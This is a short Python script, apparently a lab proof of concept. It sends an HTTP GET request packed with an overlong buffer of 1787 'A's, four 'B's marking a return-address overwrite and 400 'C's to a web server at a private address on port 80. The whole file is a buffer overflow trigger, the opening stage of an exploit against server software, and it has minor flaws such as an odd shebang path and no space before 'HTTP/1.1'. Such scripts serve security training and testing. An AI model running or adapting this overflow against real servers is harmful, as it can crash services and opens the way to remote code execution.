#!/usr/share/python
import socket

princi_buffer="GET "+ "\x41"*1787 + "\x42"*4 + "\x43"*400 + "HTTP/1.1\r\n\r\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.56.102", 80))

sock.send(princi_buffer)
sock.recv(1024)
sock.close()
exit()
